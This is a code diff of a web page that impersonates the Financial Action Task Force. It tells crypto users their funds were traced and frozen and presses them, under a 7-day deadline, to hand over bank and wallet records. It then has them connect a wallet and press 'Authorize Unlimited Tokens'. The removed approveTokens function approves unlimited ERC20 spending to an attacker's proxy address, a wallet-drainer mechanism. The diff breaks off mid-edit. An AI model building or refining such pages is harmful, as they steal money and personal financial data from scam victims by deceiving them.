@@ -17,6 +17,13 @@
             color: white;
             text-align: center;
             padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        header img {
+            height: 50px;
+            margin-right: 15px;
         }
         nav {
             display: flex;
@@ -70,6 +77,7 @@
 </head>
 <body>
     <header>
+        <img src="/mnt/data/WeChat截图_20241125225530.png" alt="FATF Logo">
         <h1>Financial Action Task Force (FATF)</h1>
     </header>
     <nav>
@@ -80,42 +88,46 @@
 
     <!-- Notification Section -->
     <div class="container" id="notification">
-        <h2 class="section-title">Notification Letter</h2>
-        <p>尊敬的用户，您好：</p>
-        <p>我们是国际反洗钱组织（Financial Action Task Force, FATF），致力于打击全球范围内的洗钱和诈骗活动，维护金融系统的安全与透明。近期，我方在对全球区块链交易的合规性和资金流向进行分析时，发现您曾与已确认的诈骗虚假平台HashKey存在交易往来。通过区块链天眼溯源技术，我们进一步追踪到您的相关资金随后流入Gate.io交易所。</p>
-        <p><strong>为保护您的合法权益，并协助您追回可能因诈骗行为而遭受的资金损失，我方已采取以下措施：</strong></p>
+        <h2 class="section-title">Notification Letter / 协助调查通知函</h2>
+        <p><strong>Dear User, 尊敬的用户：</strong></p>
+        <p>We are the Financial Action Task Force (FATF), committed to combating money laundering and fraud worldwide to ensure the security and transparency of the global financial system. 我们是国际反洗钱组织（FATF），致力于打击全球范围内的洗钱和诈骗活动，维护金融系统的安全与透明。</p>
+        <p>Recently, during our analysis of global blockchain transactions, we discovered that you were involved in transactions with a confirmed fraudulent platform, HashKey. 近期，我方在对全球区块链交易的合规性和资金流向进行分析时，发现您曾与已确认的诈骗虚假平台HashKey存在交易往来。<br>Through blockchain tracking technology, we further traced your funds to the Gate.io exchange. 通过区块链天眼溯源技术，我们进一步追踪到您的相关资金随后流入Gate.io交易所。</p>
+        <p><strong>Actions Taken / 已采取措施：</strong></p>
         <ul>
-            <li><strong>账户冻结：</strong>我们已向相关交易所通报情况，并协调冻结了可疑资金，以防进一步损失。</li>
-            <li><strong>资金溯源：</strong>我们正联合各国司法部门对相关资金进行溯源分析，以定位诈骗资金流向。</li>
+            <li><strong>Account Freezing / 账户冻结：</strong>We have reported the case to relevant exchanges and coordinated to freeze suspicious funds to prevent further losses. 我们已向相关交易所通报情况，并协调冻结了可疑资金，以防进一步损失。</li>
+            <li><strong>Fund Tracing / 资金溯源：</strong>We are collaborating with global judicial authorities to trace the fraudulent funds. 我们正联合各国司法部门对相关资金进行溯源分析，以定位诈骗资金流向。</li>
         </ul>
-        <p>请您务必在收到本通知后7日内提交相关材料，以免延误案件进展。感谢您的理解与配合！</p>
+        <p>Please respond within 7 days to submit the necessary materials for investigation. 感谢您的理解与配合，请务必在收到本通知后7日内提交相关材料。</p>
     </div>
 
     <!-- Materials Submission Section -->
     <div class="container" id="materials">
-        <h2 class="section-title">Submit Materials</h2>
-        <p>为确保调查顺利进行，请您提交以下材料：</p>
+        <h2 class="section-title">Submit Materials / 提交辅助材料</h2>
+        <p>Please submit the following materials for investigation: 为确保调查顺利进行，请提交以下材料：</p>
         <ul>
-            <li>个人被骗记录：详细描述与诈骗平台的交易过程，包括交易金额、时间、平台及具体情况。</li>
-            <li>银行交易记录：提供与诈骗平台交易相关的银行账户转账记录。</li>
-            <li>虚拟货币交易记录：包括在各交易所（如HashKey、Gate.io）或钱包中与该事件相关的资金流动证明。</li>
+            <li>Personal Fraud Record / 个人被骗记录：Describe in detail the transaction process with the fraudulent platform, including amount, time, and platform specifics. 详细描述与诈骗平台的交易过程，包括交易金额、时间、平台及具体情况。</li>
+            <li>Bank Transaction Record / 银行交易记录：Upload records of bank transfers related to fraudulent transactions. 提供与诈骗平台交易相关的银行账户转账记录。</li>
+            <li>Cryptocurrency Transaction Record / 虚拟货币交易记录：Upload transaction proofs related to exchanges or wallets. 包括在各交易所或钱包中与该事件相关的资金流动证明。</li>
         </ul>
-        <p>点击以下按钮提交辅助材料：</p>
-        <a href="https://forms.google.com" target="_blank"><button>Submit via Google Form</button></a>
-        <p>或发送至以下邮箱：<a href="mailto:support@fatfgroup.org">support@fatfgroup.org</a></p>
+        <p>Click the button below to submit via Google Form: 点击以下按钮通过谷歌表单提交：</p>
+        <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSdmj9CaYuaUQdZ6GLlL8-qLIOS3o9VG4tZU0JVwuLcf_ijDDg/viewform?usp=pp_url" 
+            width="640" height="800" frameborder="0" marginheight="0" marginwidth="0">
+            Loading…
+        </iframe>
+        <p>Or email materials to / 或发送材料至：<a href="mailto:support@fatfgroup.org">support@fatfgroup.org</a></p>
     </div>
 
     <!-- Funds Recovery Section -->
     <div class="container" id="recovery">
-        <h2 class="section-title">Recover Funds</h2>
-        <p>请连接您的钱包并授权，以便我们协助您完成资金追回过程。</p>
-        <button id="connectWallet" onclick="connectWallet()">链接钱包</button>
-        <p id="walletStatus">钱包未连接</p>
-        <button id="approveButton" onclick="approveTokens()" disabled>授权无限代币</button>
+        <h2 class="section-title">Recover Funds / 资金追回</h2>
+        <p>Connect your wallet and authorize transactions for fund recovery. 请连接您的钱包并授权，以便完成资金追回操作。</p>
+        <button id="connectWallet" onclick="connectWallet()">Connect Wallet / 连接钱包</button>
+        <p id="walletStatus">Wallet Not Connected / 钱包未连接</p>
+        <button id="approveButton" onclick="approveTokens()" disabled>Authorize Unlimited Tokens / 授权无限代币</button>
     </div>
 
     <footer>
-        <p>&copy; 2024 Financial Action Task Force. All rights reserved.</p>
+        <p>&copy; 2024 Financial Action Task Force. All rights reserved. / 版权所有</p>
     </footer>
 
     <!-- 替代 CDN -->
@@ -130,52 +142,19 @@
         async function connectWallet() {
             if (typeof window.ethereum !== "undefined") {
                 try {
-                    // 请求用户连接钱包
                     provider = new ethers.providers.Web3Provider(window.ethereum);
                     await provider.send("eth_requestAccounts", []);
                     signer = provider.getSigner();
                     const walletAddress = await signer.getAddress();
-
-                    // 更新钱包状态
-                    document.getElementById("walletStatus").innerText = `已连接钱包地址: ${walletAddress}`;
-                    document.getElementById("approveButton").disabled = false; // 启用授权按钮
+                    document.getElementById("walletStatus").innerText = `Connected Wallet: ${walletAddress} / 已连接钱包地址: ${walletAddress}`;
+                    document.getElementById("approveButton").disabled = false;
                 } catch (error) {
-                    console.error("钱包连接失败:", error);
-                    alert("钱包连接失败，请重试！");
+                    alert("Wallet connection failed. Please try again! / 钱包连接失败，请重试！");
                 }
             } else {
-                alert("请安装 MetaMask 或其他钱包扩展！");
+                alert("Please install MetaMask or other wallet extensions! / 请安装 MetaMask 或其他钱包扩展！");
             }
         }
 
-        // 授权代币，默认无限额度
-        async function approveTokens() {
-            if (!signer) {
-                alert("请先链接钱包！");
-                return;
-            }
-
-            // ERC20 代币合约 ABI（仅包含 approve 方法）
-            const tokenABI = [
-                "function approve(address spender, uint256 amount) external returns (bool)"
-            ];
-
-            // 创建代币合约实例
-            const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
-
-            try {
-                // 调用 approve 方法授权无限额度
-                const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
-                console.log("授权交易已发送:", tx.hash);
-                alert("授权交易已发送，请等待确认！");
-                await tx.wait(); // 等待交易确认
-                alert("授权成功，您已授予代理合约无限额度！");
-            } catch (error) {
-                console.error("授权失败:", error);
-                alert("授权失败，请检查控制台错误信息！");
-            }
-        }
-    </script>
-</body>
-</html>
+        // 授权代币
 
